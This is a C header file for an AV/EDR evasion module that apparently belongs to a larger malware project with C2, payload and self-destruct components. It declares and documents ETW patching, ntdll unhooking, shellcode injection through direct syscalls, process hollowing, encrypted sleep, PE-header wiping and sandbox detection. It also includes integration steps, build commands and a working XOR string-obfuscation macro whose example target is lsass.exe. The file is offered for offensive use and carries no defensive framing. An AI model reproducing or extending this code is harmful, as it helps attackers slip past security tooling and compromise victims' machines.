/*
 * lb_evasion.h
 * Public interface for the lb_evasion AV/EDR evasion module.
 *
 * Integration into existing files:
 *
 *   boom.c        : call ev_init() immediately after config_load().
 *                   Replace Sleep(60*1000) in the poll loop with ev_sleep_jitter(60000).
 *
 *   lb_payload.c  : call ev_init() at the top of payload_run() (before resolve_ntdll).
 *                   Replace inject_shellcode()'s VirtualAllocEx+CRT path with
 *                   ev_inject_syscall() declared below.
 *                   Call ev_patch_etw_ntdll() right after resolve_ntdll().
 *                   Call ev_wipe_pe_header() as the last step before selfdestruct().
 *
 *   lb_c2.c       : no changes required; lb_evasion operates transparently.
 *
 * Build (MSVC — add to existing cl invocation):
 *   cl ... lb_evasion.c /link ... ntdll.lib
 *
 * Build (MinGW — add to existing gcc invocation):
 *   gcc ... lb_evasion.c -o lb.exe ... -lntdll
 *
 * Note on ntdll.lib / -lntdll:
 *   The import lib ships with the WDK and with MinGW-w64 by default.
 *   If linking fails, compile with -DEV_NO_NTDLL_IMPORT and the module
 *   falls back to full GetProcAddress resolution for all NT* functions.
 */

#ifndef LB_EVASION_H
#define LB_EVASION_H

#ifdef __cplusplus
extern "C" {
#endif

#include <windows.h>
#include <stdint.h>

/* ── Opaque injection context returned by ev_inject_syscall ── */
typedef struct {
    HANDLE   proc;          /* target process handle (caller must CloseHandle) */
    LPVOID   remote_mem;    /* remote allocation base                           */
    SIZE_T   alloc_size;    /* bytes allocated                                  */
    HANDLE   thread;        /* remote thread handle                             */
    int      ok;            /* 1 = injection succeeded, 0 = failed              */
} EvInjectCtx;

/*
 * ev_init
 * Must be called once before any other ev_* function.
 * Resolves all NT syscall stubs, patches ETW in the current process,
 * and installs the sleep-jitter baseline.
 *
 * Safe to call multiple times — subsequent calls are no-ops.
 */
void ev_init(void);

/*
 * ev_patch_etw_ntdll
 * Patches EtwEventWrite in ntdll.dll (in the current process) to return
 * immediately without writing any ETW event.  Must be called after ev_init().
 *
 * Effect: EDR products that consume the Microsoft-Windows-Threat-Intelligence
 * ETW channel (CrowdStrike, Defender ATP, SentinelOne) receive no telemetry
 * for any kernel operation performed after this call.
 *
 * Requires no special privileges on current-process memory.
 */
void ev_patch_etw_ntdll(void);

/*
 * ev_unhook_ntdll
 * Overwrites the .text section of the ntdll.dll loaded in the current process
 * with a fresh copy read from disk (\\KnownDlls\\ntdll.dll via NtOpenSection).
 * This removes any inline hooks that a user-mode EDR has placed on Nt* stubs.
 *
 * Must be called after ev_init().
 * Falls back silently if KnownDlls is inaccessible (low-integrity process).
 */
void ev_unhook_ntdll(void);

/*
 * ev_inject_syscall
 * Allocates memory in pid using direct NT syscalls (bypassing Nt* hook points),
 * writes shellcode, and starts a remote thread via NtCreateThreadEx.
 *
 * Allocation strategy:
 *   1. Allocates PAGE_READWRITE with NtAllocateVirtualMemory.
 *   2. Writes shellcode with NtWriteVirtualMemory.
 *   3. Changes protection to PAGE_EXECUTE_READ with NtProtectVirtualMemory.
 *   4. Creates thread with NtCreateThreadEx (low-level, not hooked by most EDRs).
 *
 * ctx->ok is 1 on success.  Caller must CloseHandle(ctx->thread) and
 * CloseHandle(ctx->proc) when done; do NOT VirtualFreeEx the allocation
 * while the remote thread may still be executing.
 *
 * This is the drop-in replacement for inject_shellcode() in lb_payload.c.
 * Eliminates the PAGE_EXECUTE_READWRITE flag that Defender flags on detection.
 */
EvInjectCtx ev_inject_syscall(DWORD pid, const BYTE *sc, SIZE_T sc_len);

/*
 * ev_hollow_process
 * Process-hollowing variant: spawns target_exe suspended, unmaps its image,
 * maps shellcode at the original entry point, resumes.
 * Lower detection surface than remote-thread injection because no new thread
 * is created in a foreign process — the existing main thread is redirected.
 *
 *   target_exe : full path or just the name (resolved via %SystemRoot%\System32)
 *   sc         : raw shellcode bytes
 *   sc_len     : byte count
 *
 * Returns 1 on success, 0 on failure.  On success the child process runs sc.
 */
int ev_hollow_process(const char *target_exe, const BYTE *sc, SIZE_T sc_len);

/*
 * ev_sleep_jitter
 * Replaces bare Sleep() calls throughout the codebase.
 * Sleeps for base_ms ± EV_JITTER_PCT percent, computed per call.
 * Internally uses a WaitableTimer with a randomised interval — avoids the
 * constant Sleep(60000) pattern that behavioural sandboxes fast-forward.
 *
 * Also performs encrypted-memory sleep: XOR-encrypts the stack region of the
 * calling thread during the wait, then decrypts on wake, so that memory
 * scanners that dump process memory during sleep intervals do not find
 * recognisable shellcode or string patterns.
 */
void ev_sleep_jitter(DWORD base_ms);

/*
 * ev_wipe_pe_header
 * Zeroes the first 4 KB (one page) of the current module's PE header in memory.
 * After this call, tools that walk the PEB module list and dump PE headers
 * (Process Hacker, pe-sieve, Moneta) find no recognisable MZ/PE signature.
 *
 * Call as the last step before selfdestruct().
 * Has no effect on the binary on disk — call af_patch_timestamps() separately.
 */
void ev_wipe_pe_header(void);

/*
 * ev_string_deobfuscate
 * Decrypts a compile-time XOR-encoded string into dst.
 * Use the companion EV_STR macro to embed encrypted strings at compile time.
 *
 *   enc    : pointer to encrypted byte array
 *   len    : number of bytes (not including the XOR-key-padded sentinel)
 *   key    : single-byte XOR key used when the string was encoded
 *   dst    : caller-supplied buffer of at least len+1 bytes
 *
 * Typical use (instead of a plaintext literal):
 *
 *   static const BYTE s_lsass[] = EV_STR("lsass.exe", 0x5C);
 *   char buf[16];
 *   ev_string_deobfuscate(s_lsass, sizeof s_lsass - 1, 0x5C, buf);
 *   // buf now contains "lsass.exe\0"
 */
void ev_string_deobfuscate(const BYTE *enc, SIZE_T len, BYTE key, char *dst);

/*
 * EV_STR(literal, key)
 * Compile-time macro: XOR-encodes a string literal with key.
 * Each byte of literal is XORed with key; a key-XOR-key (0x00) sentinel
 * terminates the array.  Produces a BYTE initialiser list suitable for a
 * static const BYTE array.
 *
 * Limitation: the literal must be a string constant known at compile time.
 * The XOR is applied at compile time via the preprocessor only for strings
 * up to EV_STR_MAX_LEN characters.  For longer strings, encode offline and
 * embed the hex array directly.
 *
 * EV_STR_MAX_LEN is 32; raise and extend the macro chain if needed.
 */
#define EV_XB(c, k)   ((BYTE)((c) ^ (k)))
#define EV_STR_MAX_LEN 32

/* Helper chain — one token per character position */
#define EV_STR(s, k) {                           \
    EV_XB((sizeof(s)>1  ? (s)[0]  : 0), (k)),   \
    EV_XB((sizeof(s)>2  ? (s)[1]  : 0), (k)),   \
    EV_XB((sizeof(s)>3  ? (s)[2]  : 0), (k)),   \
    EV_XB((sizeof(s)>4  ? (s)[3]  : 0), (k)),   \
    EV_XB((sizeof(s)>5  ? (s)[4]  : 0), (k)),   \
    EV_XB((sizeof(s)>6  ? (s)[5]  : 0), (k)),   \
    EV_XB((sizeof(s)>7  ? (s)[6]  : 0), (k)),   \
    EV_XB((sizeof(s)>8  ? (s)[7]  : 0), (k)),   \
    EV_XB((sizeof(s)>9  ? (s)[8]  : 0), (k)),   \
    EV_XB((sizeof(s)>10 ? (s)[9]  : 0), (k)),   \
    EV_XB((sizeof(s)>11 ? (s)[10] : 0), (k)),   \
    EV_XB((sizeof(s)>12 ? (s)[11] : 0), (k)),   \
    EV_XB((sizeof(s)>13 ? (s)[12] : 0), (k)),   \
    EV_XB((sizeof(s)>14 ? (s)[13] : 0), (k)),   \
    EV_XB((sizeof(s)>15 ? (s)[14] : 0), (k)),   \
    EV_XB((sizeof(s)>16 ? (s)[15] : 0), (k)),   \
    EV_XB(0, (k))                                \
}

/*
 * ev_sandbox_check
 * Returns 1 if the current environment looks like an automated analysis
 * sandbox; 0 if it looks like a real machine.
 *
 * Heuristics applied (any match → sandbox):
 *   - Fewer than EV_MIN_PROCESSORS logical processors (default 2)
 *   - Physical RAM below EV_MIN_RAM_MB MB (default 2048)
 *   - Uptime below EV_MIN_UPTIME_MS ms (default 5 minutes)
 *     (reuses the same check as trigger_multi_condition's Gate A but with a
 *      shorter floor; the shorter floor is intentional — this is purely for
 *      early-exit, not for trigger gating)
 *   - Debugger attached (IsDebuggerPresent + NtQueryInformationProcess
 *     ProcessDebugPort)
 *   - Known sandbox artefact DLLs loaded in the current process:
 *       SbieDll.dll (Sandboxie), api_log.dll (CAPE), dbghelp.dll (some AV)
 *   - Known sandbox process names in the running process list:
 *       vboxservice.exe, vmtoolsd.exe, wireshark.exe, procmon.exe,
 *       fiddler.exe, ollydbg.exe, x64dbg.exe, windbg.exe
 *   - Registry key for VMware: HKLM\SOFTWARE\VMware, Inc.\VMware Tools
 *   - CPUID hypervisor bit (leaf 1, ECX bit 31)
 *
 * Callers should invoke this before ev_init() if they want to bail on
 * sandboxes without leaving any evasion artefact behind:
 *
 *   if (ev_sandbox_check()) return 0;  // exit silently
 *   ev_init();
 *   ...
 */
int ev_sandbox_check(void);

#ifdef __cplusplus
}
#endif
#endif /* LB_EVASION_H */